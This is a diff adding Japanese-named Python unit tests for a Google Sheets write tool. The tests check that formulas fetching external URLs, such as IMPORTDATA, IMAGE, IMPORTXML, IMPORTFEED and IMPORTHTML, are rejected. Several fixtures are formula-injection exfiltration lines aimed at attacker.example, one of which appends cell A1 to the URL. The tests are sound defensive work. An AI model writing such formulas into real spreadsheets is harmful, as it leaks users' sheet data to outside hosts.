@@ -189,6 +189,50 @@ class SheetsTest(unittest.TestCase):
         )
         self.assertEqual(s.sheets_values.append.call_args.kwargs["valueInputOption"], "USER_ENTERED")
 
+    def _write_formulas(self, values, option="USER_ENTERED"):
+        """書き込みツールごとに values を書き込み、(ツール名, 結果, API 呼び出し) を返す。"""
+        for name in ("sheets_write_range", "sheets_append_rows"):
+            s = FakeServices({FILE_ID: MY_FILE})
+            args = {"spreadsheet_id": FILE_ID, "range": "A1", "values": values, "value_input_option": option}
+            yield name, call(s, name, args), WRITE_TOOLS[name][1](s)
+
+    def test_外部に出ない数式は書き込める(self):
+        values = [['=SUM(A1:A3)', '=IMPORTRANGE("https://docs.google.com/spreadsheets/d/x", "A1")', '=HYPERLINK("https://example.com")']]
+        for name, result, api in self._write_formulas(values):
+            with self.subTest(tool=name):
+                self.assertFalse(result["isError"], result)
+                self.assertEqual(api.call_args.kwargs["body"], {"values": values})
+
+    def test_外部URLにアクセスする関数は拒否する(self):
+        cases = {
+            "そのまま": '=IMPORTDATA("https://attacker.example/?d="&A1)',
+            "小文字": '=image("https://attacker.example/a.png")',
+            "空白入り": '= IMAGE ("https://attacker.example/a.png")',
+            "入れ子": '=IF(1,IMPORTXML("https://attacker.example","//a"))',
+            "先頭が+": '+IMPORTFEED("https://attacker.example")',
+        }
+        for label, formula in cases.items():
+            for name, result, api in self._write_formulas([[formula]]):
+                with self.subTest(case=label, tool=name):
+                    self.assertTrue(result["isError"])
+                    api.assert_not_called()
+
+    def test_1セルでも該当すれば全体を拒否し位置を示す(self):
+        values = [["=SUM(A1:A3)", "a"], [1, '=IMPORTHTML("https://attacker.example","table",1)']]
+        for name, result, api in self._write_formulas(values):
+            with self.subTest(tool=name):
+                self.assertTrue(result["isError"])
+                self.assertIn("values[1][1]（IMPORTHTML）", result["content"][0]["text"])
+                api.assert_not_called()
+
+    def test_RAWなら外部アクセス関数も文字列として書き込める(self):
+        values = [['=IMPORTDATA("https://example.com")']]
+        for name, result, api in self._write_formulas(values, option="RAW"):
+            with self.subTest(tool=name):
+                self.assertFalse(result["isError"], result)
+                self.assertEqual(api.call_args.kwargs["valueInputOption"], "RAW")
+                self.assertEqual(api.call_args.kwargs["body"], {"values": values})
+
     def test_セル値は文字列_数値_真偽値のみ(self):
         schema = load_tools()["sheets_write_range"].input_schema
         validate(schema, {"spreadsheet_id": FILE_ID, "range": "A1", "values": [["a", 1, 1.5, False]]})
